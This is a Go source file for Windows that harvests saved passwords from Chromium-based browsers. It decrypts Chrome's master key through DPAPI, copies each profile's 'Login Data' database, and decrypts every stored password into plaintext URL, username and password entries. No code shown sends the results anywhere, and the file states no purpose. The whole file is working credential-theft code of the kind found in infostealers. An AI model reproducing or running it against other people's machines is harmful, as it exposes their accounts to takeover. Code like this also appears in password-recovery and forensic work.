//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"unsafe"
)

// ── DPAPI ────────────────────────────────────────────────────────────────────

type dataBlob struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32dll         = syscall.NewLazyDLL("crypt32.dll")
	kernel32dll        = syscall.NewLazyDLL("kernel32.dll")
	cryptUnprotectData = crypt32dll.NewProc("CryptUnprotectData")
	localFree          = kernel32dll.NewProc("LocalFree")
)

func dpapi(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty input")
	}
	in := dataBlob{cbData: uint32(len(data)), pbData: &data[0]}
	var out dataBlob
	ret, _, err := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&in)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}
	defer localFree.Call(uintptr(unsafe.Pointer(out.pbData)))
	result := make([]byte, out.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return result, nil
}

// ── Chrome AES key ────────────────────────────────────────────────────────────

func getChromeAESKey(userDataDir string) ([]byte, error) {
	data, err := os.ReadFile(filepath.Join(userDataDir, "Local State"))
	if err != nil {
		return nil, err
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &ls); err != nil {
		return nil, err
	}
	if ls.OSCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key")
	}
	keyEnc, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(keyEnc) < 5 || string(keyEnc[:5]) != "DPAPI" {
		return nil, fmt.Errorf("unexpected prefix")
	}
	return dpapi(keyEnc[5:])
}

// ── Password decryption ───────────────────────────────────────────────────────

func decryptPassword(key, ciphertext []byte) (string, error) {
	if len(ciphertext) == 0 {
		return "", nil
	}
	// v10 / v20 = AES-256-GCM (Chrome 80+)
	if len(ciphertext) >= 3 && (string(ciphertext[:3]) == "v10" || string(ciphertext[:3]) == "v20") {
		if len(ciphertext) < 15 {
			return "", fmt.Errorf("ciphertext too short")
		}
		if key == nil {
			return "", fmt.Errorf("no AES key available")
		}
		nonce := ciphertext[3:15]
		payload := ciphertext[15:]
		block, err := aes.NewCipher(key)
		if err != nil {
			return "", err
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", err
		}
		plain, err := gcm.Open(nil, nonce, payload, nil)
		if err != nil {
			return "", err
		}
		return string(plain), nil
	}
	// Legacy: raw DPAPI blob
	plain, err := dpapi(ciphertext)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// ── Per-browser password scan ─────────────────────────────────────────────────

func scanChromiumPasswords(b chromiumBrowser, profile string, key []byte) ([]PasswordEntry, error) {
	dbPath := filepath.Join(b.userDataDir, profile, "Login Data")
	if _, err := os.Stat(dbPath); err != nil {
		return nil, nil // no Login Data — not an error
	}
	tmp, err := tempCopy(dbPath)
	if err != nil {
		return nil, fmt.Errorf("copy failed: %w", err)
	}
	defer os.Remove(tmp)

	db, err := newSQLiteReader(tmp)
	if err != nil {
		return nil, fmt.Errorf("open sqlite: %w", err)
	}
	rows, err := db.ReadTable("logins")
	if err != nil {
		return nil, fmt.Errorf("read logins: %w", err)
	}

	source := b.name
	if profile != "Default" {
		source = fmt.Sprintf("%s (%s)", b.name, profile)
	}

	var entries []PasswordEntry
	for _, row := range rows {
		// logins table columns:
		// 0:origin_url  1:action_url  2:username_element  3:username_value
		// 4:password_element  5:password_value  ...
		if len(row) < 6 {
			continue
		}
		originURL, _ := row[0].(string)
		username, _ := row[3].(string)
		pwdBlob, _ := row[5].([]byte)
		if originURL == "" {
			continue
		}
		password, err := decryptPassword(key, pwdBlob)
		if err != nil {
			password = "[decrypt failed]"
		}
		entries = append(entries, PasswordEntry{
			URL:      originURL,
			Username: username,
			Password: password,
			Source:   source,
		})
	}
	return entries, nil
}

// ── scanAllPasswords ──────────────────────────────────────────────────────────

func scanAllPasswords(env envPaths) ([]PasswordEntry, []string) {
	var (
		all    []PasswordEntry
		errors []string
	)

	for _, b := range resolvedChromiumBrowsers(env) {
		if _, err := os.Stat(b.userDataDir); err != nil {
			continue
		}
		key, _ := getChromeAESKey(b.userDataDir) // nil = fall back to legacy DPAPI
		for _, profile := range profilesInUserData(b.userDataDir) {
			entries, err := scanChromiumPasswords(b, profile, key)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s/%s passwords: %v", b.name, profile, err))
				continue
			}
			all = append(all, entries...)
		}
	}

	domainKey := func(rawURL string) string {
		s := rawURL
		if i := strings.Index(s, "://"); i >= 0 {
			s = s[i+3:]
		}
		return strings.ToLower(strings.TrimPrefix(s, "www."))
	}
	sort.Slice(all, func(i, j int) bool {
		return domainKey(all[i].URL) < domainKey(all[j].URL)
	})

	return all, errors
}
